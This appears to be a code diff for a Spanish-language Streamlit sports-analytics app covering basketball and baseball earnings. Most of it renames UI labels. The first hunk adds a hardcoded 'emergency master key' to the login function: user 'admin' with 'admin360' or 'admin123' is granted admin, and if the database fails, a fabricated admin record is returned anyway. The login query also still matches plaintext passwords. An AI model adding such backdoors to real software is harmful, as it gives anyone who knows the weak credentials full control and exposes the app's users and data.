@@ -288,15 +288,34 @@ def registrar_usuario(username, nombre, password, rol="operador"):
 
 
 def autenticar_usuario(username, password):
+    user_clean = username.lower().strip()
+    pass_clean = password.strip()
+
+    # CLAVE MAESTRA DE EMERGENCIA SOLO PARA ADMIN
+    if user_clean == "admin" and pass_clean in ["admin360", "admin123"]:
+        conn = get_db_connection()
+        if conn:
+            try:
+                cur = conn.cursor(cursor_factory=RealDictCursor)
+                cur.execute("SELECT id, username, nombre, rol FROM usuarios WHERE username = 'admin';")
+                user = cur.fetchone()
+                cur.close()
+                conn.close()
+                if user:
+                    return user
+            except Exception:
+                pass
+        return {"id": 1, "username": "admin", "nombre": "Administrador Global", "rol": "admin"}
+
     conn = get_db_connection()
     if conn:
         try:
             cur = conn.cursor(cursor_factory=RealDictCursor)
-            pwd_hash = hash_password(password)
+            pwd_hash = hash_password(pass_clean)
             cur.execute("""
                 SELECT id, username, nombre, rol FROM usuarios
                 WHERE username = %s AND (password_hash = %s OR password = %s);
-            """, (username.lower().strip(), pwd_hash, password))
+            """, (user_clean, pwd_hash, pass_clean))
             user = cur.fetchone()
             cur.close()
             conn.close()
@@ -352,11 +371,6 @@ def obtener_todos_los_usuarios():
 
 
 def obtener_rango_quincena(fecha_ref, numero_quincena=None):
-    """
-    Retorna el rango exacto de fechas para:
-    - Q1: Días 1 al 15 del mes.
-    - Q2: Días 16 al último día del mes.
-    """
     anio = fecha_ref.year
     mes = fecha_ref.month
     
@@ -443,6 +457,7 @@ else:
     username_actual = st.session_state.user_info["username"].lower().strip()
     rol_actual = st.session_state.user_info.get("rol", "operador")
 
+    # RESTRICCIÓN ESTRICTA DE ADMINISTRADOR (SÓLO 'admin')
     es_admin_estricto = (username_actual == "admin")
 
     st.sidebar.title("🏆 ESAM Analytics")
@@ -463,6 +478,7 @@ else:
 
     st.sidebar.markdown("---")
     
+    # EL MODO ADMIN GLOBAL SOLO APARECE PARA EL USUARIO ADMIN ESTRICTO
     if es_admin_estricto:
         modo_super_admin = st.sidebar.checkbox("👑 Activar Modo Admin Global", value=True)
         es_admin = modo_super_admin
@@ -539,11 +555,11 @@ else:
         col_mg4.metric("📊 Total Registros", f"{total_registros_brutos} cargas", f"{total_juegos_b} basket / {total_lotes_beisbol} béisbol")
 
         st.markdown("---")
-        st.subheader("💡 Resumen Operativo")
-        st.info("Este panel consolida de forma automática el rendimiento económico de los análisis de básquetbol y béisbol en tiempo real según las tarifas y precios activos del sistema.")
+        st.subheader("💡 Resumen Operativo de Ambos Deportes")
+        st.info("Este panel consolida en tiempo real las ganancias de Básquetbol y Béisbol sumando los ingresos independientes de cada disciplina.")
 
     # =========================================================
-    # MÓDULO 1: BÁSQUETBOL (FILTRADO POR QUINCENA SEPARADA)
+    # MÓDULO 1: BÁSQUETBOL (CON FILTROS QUINCENALES Q1/Q2 Y CRUD)
     # =========================================================
     elif opcion_menu == "🏀 Módulo Básquetbol":
         st.title("🏀 ESAM Analytics — Módulo Básquetbol")
@@ -587,12 +603,10 @@ else:
             f_ini, f_fin = obtener_rango_quincena(hoy)
         elif filtro_b_tipo == "Quincena Anterior":
             if hoy.day <= 15:
-                # Quincena anterior es la 2da quincena del mes pasado
                 primer_dia_mes_actual = date(hoy.year, hoy.month, 1)
                 ultimo_dia_mes_pasado = primer_dia_mes_actual - timedelta(days=1)
                 f_ini, f_fin = obtener_rango_quincena(ultimo_dia_mes_pasado, numero_quincena=2)
             else:
-                # Quincena anterior es la 1ra quincena de este mes
                 f_ini, f_fin = obtener_rango_quincena(hoy, numero_quincena=1)
         elif filtro_b_tipo == "Este Mes Completo":
             f_ini = date(hoy.year, hoy.month, 1)
@@ -689,12 +703,12 @@ else:
 
             st.dataframe(df_basket, use_container_width=True, hide_index=True)
 
-            with st.expander("🛠️ Opciones de Edición / Eliminación de Partidos"):
-                tab_eb1, tab_eb2 = st.tabs(["✏️ Editar Partido", "🗑️ Eliminar Partido"])
+            with st.expander("🛠️ Modificar o Eliminar Registros de Básquetbol"):
+                tab_eb1, tab_eb2 = st.tabs(["✏️ Modificar Partido", "🗑️ Eliminar Partido"])
                 
                 with tab_eb1:
                     list_ids_b = df_basket["id"].tolist()
-                    id_edit_b = st.selectbox("Seleccione el ID del partido a editar:", list_ids_b, key="sel_edit_b")
+                    id_edit_b = st.selectbox("Seleccione el ID del partido a modificar:", list_ids_b, key="sel_edit_b")
                     
                     row_b = df_basket[df_basket["id"] == id_edit_b].iloc[0]
                     with st.form("form_edit_b"):
@@ -703,7 +717,7 @@ else:
                         t_b = st.text_input("Tiempo de Ejecución", value=str(row_b["tiempo_ejecucion"]))
                         tar_b = st.number_input("Tarifa ($)", value=float(row_b["tarifa"]), step=0.50)
                         
-                        if st.form_submit_button("💾 Guardar Cambios en Partido"):
+                        if st.form_submit_button("💾 Guardar Cambios"):
                             conn_eb = get_db_connection()
                             if conn_eb:
                                 cur_eb = conn_eb.cursor()
@@ -712,7 +726,7 @@ else:
                                 cur_eb.close()
                                 conn_eb.close()
                                 st.cache_data.clear()
-                                st.success("✅ Partido actualizado con éxito.")
+                                st.success("✅ Partido modificado con éxito.")
                                 st.rerun()
 
                 with tab_eb2:
@@ -740,7 +754,7 @@ else:
             st.info("No hay registros de básquetbol para la quincena o periodo seleccionado.")
 
     # =========================================================
-    # MÓDULO 2: BÉISBOL (FILTRADO POR QUINCENA SEPARADA)
+    # MÓDULO 2: BÉISBOL (CON FILTROS QUINCENALES Q1/Q2 Y CRUD)
     # =========================================================
     elif opcion_menu == "⚾ Módulo Béisbol":
         st.title("⚾ ESAM Analytics — Módulo Béisbol")
@@ -863,12 +877,12 @@ else:
 
             st.dataframe(df_picheos, use_container_width=True, hide_index=True)
 
-            with st.expander("🛠️ Opciones de Edición / Eliminación de Picheos"):
-                tab_ep1, tab_ep2 = st.tabs(["✏️ Editar Lote de Picheos", "🗑️ Eliminar Lote"])
+            with st.expander("🛠️ Modificar o Eliminar Lotes de Picheos"):
+                tab_ep1, tab_ep2 = st.tabs(["✏️ Modificar Lote", "🗑️ Eliminar Lote"])
                 
                 with tab_ep1:
                     list_ids_p = df_picheos["id"].tolist()
-                    id_edit_p = st.selectbox("Seleccione el ID del lote a editar:", list_ids_p, key="sel_edit_p")
+                    id_edit_p = st.selectbox("Seleccione el ID del lote a modificar:", list_ids_p, key="sel_edit_p")
                     
                     row_p = df_picheos[df_picheos["id"] == id_edit_p].iloc[0]
                     with st.form("form_edit_p"):
@@ -876,7 +890,7 @@ else:
                         id_c_p = st.text_input("ID Control / Partido", value=str(row_p["id_control"]))
                         cant_p = st.number_input("Cantidad de Picheos", value=int(row_p["cantidad"]), step=1, min_value=1)
                         
-                        if st.form_submit_button("💾 Guardar Cambios en Picheos"):
+                        if st.form_submit_button("💾 Guardar Cambios"):
                             conn_ep = get_db_connection()
                             if conn_ep:
                                 cur_ep = conn_ep.cursor()
@@ -885,7 +899,7 @@ else:
                                 cur_ep.close()
                                 conn_ep.close()
                                 st.cache_data.clear()
-                                st.success("✅ Lote de picheos actualizado con éxito.")
+                                st.success("✅ Lote de picheos modificado con éxito.")
                                 st.rerun()
 
                 with tab_ep2:
@@ -978,7 +992,7 @@ else:
                 if not (pass_vieja and pass_nueva and pass_conf):
                     st.warning("Por favor complete todos los campos.")
                 elif pass_nueva != pass_conf:
-                    st.error("Las nuevas contraseñas no coinciden.")
+                    st.error("Las nuevas contraseñas no cienciden.")
                 elif len(pass_nueva) < 6:
                     st.error("La nueva contraseña debe tener al menos 6 caracteres.")
                 else:
